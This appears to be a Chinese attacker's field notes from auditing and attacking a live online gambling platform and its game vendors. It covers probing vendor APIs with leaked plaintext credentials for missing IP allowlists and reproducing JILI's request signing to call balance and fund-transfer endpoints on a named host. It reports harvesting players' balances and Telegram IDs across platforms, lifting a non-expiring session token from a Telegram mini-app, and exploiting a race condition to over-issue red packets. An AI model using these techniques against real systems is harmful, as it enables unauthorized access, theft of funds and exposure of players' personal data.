# 博彩平台厂商 API 探活与 TG 小程序实测(KK/Qzino 会话 20260731 固化)

来源会话:KK 综合平台(kkzonghe)源码审计 + 线上实测。源码含 11 家游戏厂商接入类
(`core/GameTo*.php`)与全部厂商凭证(config 明文)。**核心教训:凭证在手 ≠ 能用,
先探活 IP 白名单;源码 ≠ 线上,先验证差异。**

## 1. 厂商 API IP 白名单探活(判定特征)

对每家厂商发一个最简只读请求(查余额/注册),按响应体判定:

| 响应特征 | 判定 |
|---|---|
| `Access denied: not in allow list` | PG 系,IP 白名单 |
| `Invalid IP`(XML) | EVO 系,IP 白名单 |
| `IP not allowed: <ip>`(JSON/明文) | JDB / XINGLI 系,IP 白名单 |
| `not-whitelisted`(code 408003) | EEAI 系,IP 白名单 |
| 403 nginx HTML(无响应体) | IM/PP/FC,疑似 nginx 层 IP 拦截 |
| **业务错误(`invalid key`/`ErrorCode`/正常 JSON)** | 🟢 **无 IP 白名单,凭证可直接用** |

实测结论(KK 平台 11 家):**仅 JILI 无白名单**;PG/EVO/EEAI/JDB/XINGLI/IM/FC 全有;
CQ9 token 被打包者截断(`eyJhbG...7JFI`)无法测;TCG 凭证在 config 无独立变量(需从
GameToTCG.php 反查)。

## 2. JILI API 完整复刻(无 IP 白名单,全接口可直调)

Base: `https://wb-api-2.huuykk865s.com/api1/` | AgentId/AgentKey 在 config 明文。

**签名算法**(踩坑修正):`key = 6位随机 + md5(参数串 + keyG) + 6位随机`
- `keyG = md5(UTC4Time + AgentId + AgentKey)`
- **UTC4Time 格式陷阱**:不是 `Y-m-d H:i:s`!是 `yymd`(2位年+2位月+日**去前导0**),
  取 `time() - 4*3600` 后的 UTC 时间。错格式 → `{"ErrorCode":2,"Message":"invalid key"}`
- Python: `g=time.gmtime(time.time()-4*3600); utc4=f"{g.tm_year%100:02d}{g.tm_mon:02d}{g.tm_mday}"`

**接口清单**(全部 GET,参数串+Key):
- `CreateMember?Account=<id>&AgentId=<AgentId>&Key=<key>` — 注册(重复=101)
- `GetMemberInfo?Accounts=<id>&AgentId=<AgentId>&Key=<key>` — 查任意玩家余额(Status!=3 有效)
- `Transfer?Account=<id>&TransactionId=<txn>&Amount=<amt>&TransferType=2&AgentId=<AgentId>&Key=<key>` — 转入;TransferType=1 转出(Amount=0 全部)
- `GetBetRecordByTime?StartTime=...&EndTime=...&Page=1&PageLimit=10000&AgentId=...&Key=...` — 注单,**窗口 ≤60 分钟**(超时返回 ErrorCode=101 "Query time interval must not longer than 60 minutes");时间格式 `Y-m-d\TH:i:s`(UTC-4)
- `LoginWithoutRedirect` — 游戏链接

**实战成果**:一个 AgentId 下挂 3 个平台玩家(yfzonghe*/qdzonghe*/mymy*)——
查询接口 = 跨平台余额+注单泄露(玩家 TG ID 全枚举、资金流透明)。
**教训:JILI Transfer 返回 `ErrorCode=4 service unavailable` = 厂商侧对代理关闭转账**,
签名已通过也调不动;这类"充值直调"需先确认厂商侧放行。

## 3. 其他厂商加密/签名复刻要点

- **JDB**:`POST apiRequest.do`,body `{"dc":"QQTB","x":AES-CBC}`;
  `AES-128-CBC` key+iv 明文,数据**空格填充**(padString 用 `' '`)+ `OPENSSL_NO_PADDING`,
  base64 后 URL-safe(+/= → -_ 空)。action=15 查余额。
- **FC**:`POST /SearchMember`,Params=`AES-128-ECB`(AgentKey 前16字节,默认 PKCS7)+
  `Sign=md5(明文JSON)`。form 提交(AgentCode/Currency/Params/Sign)。
- **EEAI**:`GET /api/wallet/balance`,sign=`md5(agent_key&ksort参数串)`(agent_key 前缀 + & 连接)。
- **XINGLI**:`POST /h5/autologin`,sign=`md5(ksort参数串+appsecret)`(后缀)。
- **EVO**:`GET /api/ecashier?cCode=RWA&ecID=<key>&euID=<id>&output=1`,XML 响应,无签名。
- **PG**:裸 POST operator_token+secret_key,`/external/Cash/v3/GetPlayerWallet|TransferIn|TransferAllOut`,
  `/external-datagrabber/Bet/v4/GetHistory`,无签名但 **IP 白名单**。

## 4. TG 小程序平台实测要点(通用)

- **真实域名从小程序拿**:`location.href`(web.telegram.org 里切 iframe context 执行)。
  源码 config 里的域名(`*.nmzh.me`)可能是旧的,线上小程序可能跑在新域(`*.nimingkj.com`)。
- **登录凭证两种**:
  - `initData`(Console 执行 `window.Telegram.WebApp.initData`)— **5 分钟过期**(auth_date 校验,
    页面不刷新值不变,刷新重进才重新签发);
  - `localStorage.getItem('token')` — **不过期**,优先用这个!直接调 API 无需再登录。
- **前端加密复刻**:Vue SPA 打包 JS 里 AES key + 签名盐明文,`ksort+JSON.stringify(无空格)+盐→md5`
  → `AES-128-CBC(随机IV前缀)+URL-safe base64` → `POST data=`。Python 复刻时注意
  `json.dumps(ensure_ascii=False, separators=(',',':'))`。
- **源码 vs 线上差异判定**:线上回调返回 `SIGN_ERROR` / `签名验证失败` = 已打补丁
  (打包源码是旧版)。先发一次探针请求确认补丁状态,再决定深挖方向,别在已修复面上浪费时间。

## 5. 平台自有玩法算法审计速查(同类平台通用)

- 红包分配:`rand(1, intval(剩余/人数*2))` 循环 — 存在 off-by-one(数量少1)、0元红包、
  最后一份 `>=` 卡死等 bug(方向均为平台省钱);
- **红包领取竞态**(可超发):剩余金额列表读-选-删-写回 与 已领总额更新是两个独立 SQL
  无事务无 CAS → 并发覆盖列表复用 → 超发。检查 `red_fenpei` 与 `red_lastanmount` 更新是否原子;
- 抽奖/转盘:`mt_rand` PHP7.1+ CSPRNG 不可预测,权重算法正确,有 Redis 锁+钻石成本 → 安全;
- 注单去重:DB 唯一键(orders)+ Redis 拉取锁,但跨月去重只查当月/上月表(>2月延迟注单可重插)。
